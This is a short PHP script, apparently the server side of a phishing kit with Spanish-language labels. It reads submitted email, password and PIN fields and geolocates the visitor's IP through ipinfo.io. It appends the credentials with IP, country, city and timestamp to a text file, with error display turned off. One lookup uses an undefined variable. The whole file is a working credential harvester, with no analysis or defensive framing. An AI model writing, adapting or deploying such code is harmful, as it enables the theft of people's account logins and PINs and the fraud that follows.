<?php
date_default_timezone_set('America/Bogota');
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];

$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
$city = trim(file_get_contents("http://ipinfo.io/{$user_ip}/city"));


$file = fopen("datax.txt", "a");
	

fwrite($file, "Correo: ".$_POST['username']."  - Contraseña: ".$_POST['password']." - Pin: ".$_POST['pin']." - Fecha: ".date('Y-m-d')." - ".date('H:i:s')." -  ".$userp." ".$cc." ".$city." " . PHP_EOL);
fwrite($file, "********************************* " . PHP_EOL);
fclose($file);

?>